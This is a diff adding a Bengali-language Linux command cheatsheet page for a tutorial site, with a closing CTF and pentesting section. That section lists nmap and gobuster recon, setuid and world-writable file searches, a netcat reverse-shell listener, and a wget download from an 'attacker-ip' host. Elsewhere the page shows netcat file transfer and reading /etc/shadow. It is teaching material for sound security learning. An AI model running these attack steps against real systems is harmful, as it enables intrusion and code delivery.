@@ -1,0 +1,354 @@
+---
+title: Linux Cheatsheet
+description: Linux Fundamentals-এর সব গুরুত্বপূর্ণ commands এক জায়গায় — quick reference।
+---
+
+import { Callout } from 'nextra/components'
+
+# Linux Cheatsheet
+
+<Callout type="info">
+  এই page-এ Linux Fundamentals section-এর সব গুরুত্বপূর্ণ commands এক জায়গায় আছে। প্রতিটা command-এর বিস্তারিত explanation সংশ্লিষ্ট section-এ পাবে। এটি শুধু quick reference হিসেবে ব্যবহার করো।
+</Callout>
+
+## Terminal Basics
+
+```bash filename="Terminal"
+# Navigation
+pwd                    # বর্তমান directory দেখো
+ls                     # files list
+ls -la                 # hidden files সহ, বিস্তারিত
+cd /path/to/dir        # directory পরিবর্তন
+cd ..                  # এক ধাপ উপরে
+cd ~                   # home directory
+
+# File Operations
+touch file.txt         # file তৈরি
+mkdir folder           # folder তৈরি
+mkdir -p a/b/c         # nested folder তৈরি
+cp source dest         # copy
+cp -r dir/ dest/       # directory recursive copy
+mv source dest         # move বা rename
+rm file.txt            # file মুছো
+rm -rf folder/         # directory সব কিছু সহ মুছো
+```
+
+## File System
+
+```bash filename="Terminal"
+# Permissions দেখো
+ls -la file.txt
+# -rwxr-xr-- 1 omar developers 1024 Apr 10 file.txt
+
+# chmod — symbolic
+chmod u+x script.sh    # owner-কে execute দাও
+chmod g+w file.txt     # group-কে write দাও
+chmod o-r file.txt     # others থেকে read সরাও
+chmod a=r file.txt     # সবাইকে read-only
+
+# chmod — numeric
+chmod 755 script.sh    # rwxr-xr-x
+chmod 644 file.txt     # rw-r--r--
+chmod 600 secret.key   # rw-------
+chmod 770 project/     # rwxrwx---
+
+# Special permissions
+chmod u+s program      # setuid
+chmod g+s folder/      # setgid
+chmod +t shared/       # sticky bit
+chmod 4755 program     # setuid numeric
+chmod 2770 folder/     # setgid numeric
+chmod 1777 shared/     # sticky bit numeric
+
+# chown
+sudo chown omar file.txt           # owner পরিবর্তন
+sudo chown omar:devs file.txt      # owner + group
+sudo chown :devs file.txt          # শুধু group
+sudo chown -R omar:devs project/   # recursive
+```
+
+## Text Manipulation
+
+```bash filename="Terminal"
+# File পড়া
+cat file.txt            # পুরো file print করো
+less file.txt           # scrollable view (q দিয়ে বের হও)
+head -n 20 file.txt     # প্রথম ২০ line
+tail -n 20 file.txt     # শেষ ২০ line
+tail -f log.txt         # live update দেখো
+
+# Searching
+grep "pattern" file.txt          # pattern খোঁজো
+grep -i "pattern" file.txt       # case-insensitive
+grep -r "pattern" /dir/          # recursive
+grep -n "pattern" file.txt       # line number সহ
+grep -v "pattern" file.txt       # pattern বাদে সব
+grep -E "pat1|pat2" file.txt     # multiple patterns
+
+# find
+find /path -name "*.txt"           # name দিয়ে খোঁজো
+find /path -type f -name "*.sh"    # শুধু file
+find /path -type d                 # শুধু directory
+find /path -perm -4000             # setuid files
+find /path -perm -0002 -type f     # world-writable files
+find /path -writable -type f       # আমি লিখতে পারি
+
+# Text processing
+cat file.txt | sort                # sort করো
+cat file.txt | uniq                # duplicate সরাও
+cat file.txt | wc -l               # line count
+cut -d":" -f1 /etc/passwd          # field বের করো
+awk '{print $1}' file.txt          # column বের করো
+sed 's/old/new/g' file.txt         # replace করো
+```
+
+## Users & Permissions
+
+```bash filename="Terminal"
+# User info
+whoami                 # বর্তমান user
+id                     # UID, GID, groups
+id omar                # নির্দিষ্ট user-এর info
+groups                 # আমার groups
+
+# User management
+sudo useradd -m omar              # user তৈরি
+sudo passwd omar                  # password set
+sudo usermod -aG devs omar        # group-এ যোগ
+sudo userdel omar                 # user মুছো
+sudo userdel -r omar              # home folder সহ মুছো
+
+# sudo
+sudo command           # root হিসেবে command
+sudo -l                # আমার sudo permissions
+sudo -i                # root shell
+sudo visudo            # sudoers edit
+
+# su
+su -                   # root-এ switch
+su - omar              # নির্দিষ্ট user-এ switch
+
+# Sensitive files
+cat /etc/passwd        # user list
+sudo cat /etc/shadow   # password hashes (root only)
+cat /etc/group         # group list
+```
+
+## Processes
+
+```bash filename="Terminal"
+# Process দেখো
+ps aux                 # সব processes
+ps aux | grep nginx    # নির্দিষ্ট process খোঁজো
+ps auxf                # tree format
+top                    # live monitor
+htop                   # better live monitor (install করতে হয়)
+
+# Process খোঁজা
+pgrep nginx            # name দিয়ে PID
+pgrep -a python3       # PID + full command
+pstree -p              # process tree
+
+# Kill
+kill 1234              # SIGTERM (graceful)
+kill -9 1234           # SIGKILL (force)
+kill -HUP 1234         # SIGHUP (reload config)
+pkill nginx            # name দিয়ে kill
+pkill -9 firefox       # name দিয়ে force kill
+killall nginx          # সব instance kill
+
+# Background jobs
+command &              # background-এ চালাও
+jobs                   # background jobs দেখো
+fg %1                  # foreground-এ আনো
+bg %1                  # background-এ চালাও
+Ctrl+Z                 # pause করো
+Ctrl+C                 # cancel করো
+nohup command &        # terminal বন্ধ হলেও চালু রাখো
+```
+
+## Networking
+
+```bash filename="Terminal"
+# IP এবং interface
+ip a                           # সব interfaces
+ip a show eth0                 # নির্দিষ্ট interface
+ip r                           # routing table
+ifconfig                       # পুরনো alternative
+hostname -I                    # IP address
+
+# Connectivity
+ping -c 4 target               # 4টা ping
+ping -c 1 -W 1 target          # 1 packet, 1s timeout
+traceroute target              # route দেখো
+
+# DNS
+nslookup google.com            # domain → IP
+dig google.com                 # detailed DNS
+dig +short google.com          # শুধু IP
+dig google.com MX              # mail servers
+dig -x 8.8.8.8                 # reverse lookup
+
+# Ports ও Services
+ss -tlnp                       # listening TCP ports
+ss -ulnp                       # listening UDP ports
+ss -tanp                       # সব connections
+ss -tlnp | grep :80            # নির্দিষ্ট port
+netstat -tlnp                  # পুরনো alternative
+sudo lsof -i :80               # port 80 কোন process
+
+# curl
+curl https://example.com                    # GET request
+curl -I https://example.com                 # শুধু headers
+curl -i https://example.com                 # headers + body
+curl -o file.html https://example.com       # file-এ save
+curl -L https://url.com                     # redirect follow
+curl -X POST url -H "Content-Type: application/json" -d '{"key":"val"}'
+curl -s -o /dev/null -w "%{http_code}" url  # status code only
+curl -k https://url.com                     # SSL ignore
+curl -v https://url.com                     # verbose
+
+# wget
+wget https://example.com/file.zip          # download
+wget -O name.zip https://url/file.zip      # নাম দিয়ে save
+wget -c https://url/file.zip               # resume
+wget -b https://url/file.zip               # background
+
+# Netcat
+nc -zv target 22               # port check
+nc -lvnp 4444                  # listener চালাও
+nc target 4444                 # connect করো
+nc -lvnp 4444 > file.txt       # file receive
+nc target 4444 < file.txt      # file send
+
+# /etc/hosts
+echo "10.10.10.10 target.thm" | sudo tee -a /etc/hosts
+```
+
+## Package Management
+
+```bash filename="Terminal"
+# apt
+sudo apt update                          # package list refresh
+sudo apt upgrade                         # সব packages update
+sudo apt install nmap                    # install
+sudo apt install -y nmap curl wget       # prompt ছাড়া
+sudo apt remove nmap                     # remove (config রাখে)
+sudo apt purge nmap                      # সব মুছো
+sudo apt autoremove                      # orphan packages
+apt search "network scanner"             # package খোঁজো
+apt show nmap                            # package info
+apt list --installed                     # installed list
+apt list --upgradeable                   # upgrade available
+
+# dpkg
+sudo dpkg -i package.deb                # .deb install
+sudo dpkg -r package-name               # remove
+sudo dpkg -P package-name               # purge
+dpkg -l                                 # সব installed
+dpkg -l | grep nginx                    # নির্দিষ্ট খোঁজো
+dpkg -s nmap                            # status দেখো
+dpkg -L nmap                            # কোন files কোথায়
+dpkg -S /usr/bin/nmap                   # কোন package install করেছে
+sudo apt install -f                     # broken dependency fix
+```
+
+## Bash Scripting
+
+```bash filename="Terminal"
+# Script তৈরি ও run করো
+nano script.sh
+chmod +x script.sh
+./script.sh
+bash script.sh
+```
+
+```bash filename="script.sh"
+#!/bin/bash
+
+# Variables
+name="Omar"
+ip=$(hostname -I | awk '{print $1}')
+
+# Input
+read -p "Target: " target
+
+# Condition
+if [ $# -eq 0 ]; then
+  echo "Usage: $0 <arg>"
+  exit 1
+fi
+
+if [ -f "/etc/passwd" ]; then
+  echo "File exists"
+fi
+
+# Loops
+for i in {1..10}; do
+  echo $i
+done
+
+for host in {1..254}; do
+  ping -c 1 -W 1 192.168.1.$host &>/dev/null && echo "alive"
+done
+
+while read -r line; do
+  echo $line
+done < wordlist.txt
+
+# Exit code
+command
+if [ $? -eq 0 ]; then
+  echo "Success"
+fi
+
+# Arguments
+echo $0   # script নাম
+echo $1   # 1st argument
+echo $#   # argument count
+echo $@   # সব arguments
+```
+
+## CyberSec Quick Commands
+
+<Callout type="warning">
+  **CTF এবং Pentesting-এ সবচেয়ে বেশি ব্যবহৃত commands:**
+
+  ```bash filename="Terminal"
+  # Initial recon
+  ip a                           # নিজের IP (tun0 = VPN)
+  ping -c 3 target               # alive? TTL দেখো OS guess করো
+  nmap -sV target                # open ports + versions
+  nmap -sC -sV -p- target        # full scan
+
+  # Web recon
+  curl -I http://target          # server info
+  curl http://target/robots.txt  # hidden paths
+  gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt
+
+  # Privilege escalation check
+  sudo -l                        # sudo permissions
+  find / -perm -4000 -type f 2>/dev/null  # setuid files
+  find / -perm -0002 -type f 2>/dev/null  # world-writable
+  cat /etc/crontab               # scheduled tasks
+  dpkg -l | grep -i "apache\|php\|mysql"  # installed versions
+
+  # Netcat reverse shell listener
+  nc -lvnp 4444
+
+  # File transfer
+  # Attacker machine:
+  python3 -m http.server 8000
+  # Target machine:
+  wget http://attacker-ip:8000/file.sh
+
+  # GTFOBins — sudo binary exploit
+  # → gtfobins.github.io
+  ```
+</Callout>
+
+**পরবর্তী →** [Linux Fundamentals Overview](/docs/linux-fundamentals)
+
+<span style={{ display: 'none' }}>
+  Search Keywords: linux cheatsheet bangla, linux commands quick reference Bengali, linux terminal commands list, cybersecurity linux commands, CTF linux commands, linux fundamentals cheatsheet bengali
+</span>
